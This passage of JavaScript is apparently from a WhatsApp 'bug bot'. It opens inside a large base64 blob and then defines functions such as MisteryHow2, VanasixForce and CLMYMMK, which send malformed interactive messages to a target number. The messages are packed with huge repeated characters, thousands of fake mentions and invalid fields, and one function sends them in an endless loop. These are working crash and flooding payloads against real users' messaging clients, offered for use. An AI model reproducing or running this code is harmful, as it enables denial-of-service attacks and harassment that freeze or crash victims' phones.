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",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Viona Kill You🔥"
                },
                footer: {
                  text: "Vlorina.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    interactiveMessage: {
                      contextInfo,
                      body: {
                        text: "⏤‌V I O N A× B A C K‌  ⃟ ✧",
                      },
                      nativeFlowMessage: {
                        buttons: [
                          {
                            name : "single_select",
                            buttonParamsJson: ApiNewFC + "",
                          },
                          {
                            name : "call_permission_request",
                            buttonParamsJson: ApiNewFC + "\u0003",
                          },
                        ],
                      },
                    },
                  }
                }
              },
              remoteJid: "@s.whatsapp.net"
            }
          }
        }
      }
    }
  }, 
  {});
  
  await vinzzoffc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

//Type 2 MisteryHow2

async function MisteryHow2(vinzzoffc, target) {
  try {
    await vinzzoffc.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐕𝐢𝐨𝐧𝐚 /#/ 𝐕𝐥𝐨𝐫𝐢𝐧𝐚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000),
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "X",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            body: {
              text: "𝐕𝐢𝐨𝐧𝐚 /#/ 𝐕𝐥𝐨𝐫𝐢𝐧𝐚",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000),
            },
          },
        },
      },
    }, {
      participant: { jid: target },
      messageId: null,
    });

    const msg2 = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "Wkwk.pptx",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
            },
            contextInfo: {
              participant: target,
              remoteJid: "X",
              mentionedJid: ["6281393001103@s.whatsapp.net"],
            },
            body: {
              text: "@6281393001103".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
            },
          },
        },
      },
    };

    await viona.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });

    for (let i = 0; i < 1; i++) {
      const messageContent = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐕𝐢𝐨𝐧𝐚 /#/ 𝐕𝐥𝐨𝐫𝐢𝐧𝐚",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                paramsJson: "{".repeat(10000),
                version: 3
              }
            }
          }
        }
      };

      await viona.relayMessage(target, messageContent, {
        participant: { jid: target }
      });

      await new Promise(resolve => setTimeout(resolve, 300));
    }

  } catch (err) {
    console.error("Terjadi eror saat ngirim bag", err);
  }
}

//Type 3 MisteryHow3

async function MisteryHow3(vinzzoffc, target) {
  vinzzoffc.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "𝗩𝗶𝗼𝗻𝗮 𝗧𝗲𝗹𝗮𝗵 𝗸𝗲𝗺𝗯𝗮𝗹𝗶!!\n\n" + "ꦽ".repeat(5000),
          hasMediaAttachment: false
        },
        body: {
          text: "ꦾ".repeat(5000) + "ꦽ".repeat(5000),
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(5000),
          buttons: [
            { name: "single_select", buttonParamsJson: VampApiUi },
            { name: "payment_method", buttonParamsJson: VampApiUi },
            { name: "form_message", buttonParamsJson: VampApiUi },
            { name: "catalog_message", buttonParamsJson: VampApiUi },
            { name: "send_location", buttonParamsJson: VampApiUi },
            { name: "review_and_pay", buttonParamsJson: VampApiUi }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function VanasixForce(jid) {
  try {
    while (true) {
      await vinzzoffc.sendMessage(jid, {
        text: "", 
        contextInfo: {
          stanzaId: "LubiX-Id" + Math.floor(Math.random() * 99999),
          mentionedJid: [
            jid,
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`)
          ],
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            title: "",
            body: "@xlwylubi",
            thumbnailUrl: null,
            sourceUrl: " t.me/xlwylubi"
          },
          message: {
            interactiveMessage: {
              body: {
                text: "𝑸𝒙 - 𝑳𝒖𝒃𝒊𝑬𝒙𝒆𝒄𝒖𝒕𝒐𝒓 ( 🌹 )"
              },
              nativeFlowMessage: {
                messageParamsJson: "[".repeat(10000)
              }
            }
          }
        }
      }, { quoted: null })

      await new Promise(resolve => setTimeout(resolve, 100))
    }
  } catch (err) {
    console.error("Error:", err)
  }
}

async function CLMYMMK(vinzzoffc, target) {
                    let msg = await generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                    message: {
                    messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                    },
                    stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc",
                    fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
                    fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
                    mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
                    mimetype: "application/was",
                    height: 512,
                    width: 512,
                    fileLength: 14390,
                    isAnimated: true,
                    contextInfo: {
                        forwardingScore: 9999,
                        isForwarded: true,
                        participant: target,
                        mentionedJid: [
                            ...Array.from(
                                { length: 1600 },
                                () => `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                            )
                        ]
                    }
                    },
                    interactiveResponseMessage: {
                    contextInfo: {
                    mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                    },
                    body: {
                    text: "ោ៝".repeat(3900),
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"᬴".repeat(90000)}\",\"flow_message_version\": \"3\"}`,
                    version: 3
                    }
                    }
                    }
                    }
